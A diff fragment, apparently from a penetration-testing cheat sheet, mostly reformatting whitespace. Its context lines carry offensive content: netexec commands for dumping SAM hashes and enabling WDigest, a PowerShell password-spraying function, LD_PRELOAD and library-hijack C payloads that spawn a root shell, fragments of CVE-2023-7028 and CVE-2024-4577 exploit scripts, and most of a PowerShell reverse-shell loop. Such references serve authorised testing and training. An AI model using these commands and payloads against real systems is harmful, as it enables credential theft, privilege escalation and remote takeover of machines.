-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --pass-pol // Password policy
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --lusers // List users
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --sam // Dump SAM
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --wdigest enable // Enable WDigest
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser' // Exec quser
+
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce --continue-on-success     // No brute, continue on success
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares                                 // List shares (generic)
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares --continue                      // List shares, continue on success
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --pass-pol                               // Password policy
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --lusers                                 // List users
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --sam                                    // Dump SAM
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --wdigest enable                         // Enable WDigest
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser'                               // Exec quser
 netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'net user Administrator /domain' --exec-method smbexec // Exec net user via smbexec
 ```
 
@@ -3441,13 +3446,13 @@ pypykatz registry --sam sam system
     Perform password spraying attack against user accounts in Active Directory.
   .PARAMETER Pass
     Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'. Do not use together with File or Url."
-	
+    
   .PARAMETER File
     Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.
-	
+    
   .PARAMETER Url
     Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.
-	
+    
   .PARAMETER Admins
     Warning: will also target privileged user accounts (admincount=1.)". Default = $false.
   .EXAMPLE
@@ -3751,12 +3756,12 @@ Function BruteForce
                         {
                             # Verbose-log if $badpwdtime in null. Possible "Cannot index into a null array" error.
                             Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"
-	
-	
-	
-				   # Try the auth with current password
-        	                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
-			
+    
+    
+    
+                   # Try the auth with current password
+                            $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
+            
                                 If ($auth -eq $true)
                                 {
                                     Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
@@ -3770,9 +3775,9 @@ Function BruteForce
                                     $numTry[$i] += 1
                                     If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                 }
-			 
-			 
-			    
+             
+             
+                
                         } # Badpwdtime-check if
 
                     } # Badwpdcount-check if
@@ -4691,8 +4696,9 @@ enum4linux-ng -A <RHOST>
 #### Evil-WinRM
 
 ```c
-evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
-evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
+evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>                                                               # Basic Evil-WinRM session using username and password
+evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERT>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -u <USERNAME> -S     # Auth with client cert/key over SSL
+evil-winrm -i <RHOST> -r <REALM>                                                                                # Specify Kerberos realm/domain
 ```
 
 #### Impacket
@@ -5399,9 +5405,9 @@ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | g
 #include <stdlib.h>
 
 void _init() {
-	unsetenv("LD_PRELOAD");
-	setresuid(0,0,0);
-	system("/bin/bash -p");
+    unsetenv("LD_PRELOAD");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
 }
 ```
 
@@ -5448,9 +5454,9 @@ ldd /PATH/TO/BINARY/<BINARY>
 static void hijack() __attribute__((constructor));
 
 void hijack() {
-	unsetenv("LD_LIBRARY_PATH");
-	setresuid(0,0,0);
-	system("/bin/bash -p");
+    unsetenv("LD_LIBRARY_PATH");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
 }
 ```
 
@@ -7534,7 +7540,7 @@ if __name__ == '__main__':
     exploit = CVE_2023_7028(
         url=args.url,
         target=args.target,
-		evil=args.evil
+        evil=args.evil
     )
     if not exploit.ask_reset():
         exit()
@@ -7558,12 +7564,12 @@ Reference: https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi
 """
 
 banner = """			 __         ___  ___________                   
-	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
-	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
-	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
-	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
-				  \\/          \\/     \\/                            
-	  
+     __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
+     \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
+      \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
+       \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
+                  \\/          \\/     \\/                            
+      
         watchTowr-vs-php_cve-2024-4577.py
         (*) PHP CGI Argument Injection (CVE-2024-4577) discovered by Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
           - Aliz Hammond, watchTowr (aliz@watchTowr.com)
@@ -7891,19 +7897,19 @@ $buffer = new-object System.Byte[] 1024;
 $encoding = new-object System.Text.AsciiEncoding;
 do
 {
-	$writer.Flush();
-	$read = $null;
-	$res = ""
-	while($stream.DataAvailable -or $read -eq $null) {
-		$read = $stream.Read($buffer, 0, 1024)
-	}
-	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
-	if(!$out.equals("exit")){
-		$args = "";
-		if($out.IndexOf(' ') -gt -1){
-			$args = $out.substring($out.IndexOf(' ')+1);
-			$out = $out.substring(0,$out.IndexOf(' '));
-			if($args.split(' ').length -gt 1){
+    $writer.Flush();
+    $read = $null;
+    $res = ""
+    while($stream.DataAvailable -or $read -eq $null) {
+        $read = $stream.Read($buffer, 0, 1024)
+    }
+    $out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+    if(!$out.equals("exit")){
+        $args = "";
+        if($out.IndexOf(' ') -gt -1){
+            $args = $out.substring($out.IndexOf(' ')+1);
+            $out = $out.substring(0,$out.IndexOf(' '));
+            if($args.split(' ').length -gt 1){
                 $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                 $pinfo.FileName = "cmd.exe"
                 $pinfo.RedirectStandardError = $true
@@ -7921,18 +7927,18 @@ do
                 } else {
                     $res = $stdout
                 }
-			}
-			else{
-				$res = (&"$out" "$args") | out-string;
-			}
-		}
-		else{
-			$res = (&"$out") | out-string;
-		}
-		if($res -ne $null){
+            }
+            else{
+                $res = (&"$out" "$args") | out-string;
+            }
+        }
+        else{
+            $res = (&"$out") | out-string;
+        }
+        if($res -ne $null){
         $writer.WriteLine($res)
     }
-	}
+    }
 }While (!$out.equals("exit"))
 $writer.close();
 $socket.close();
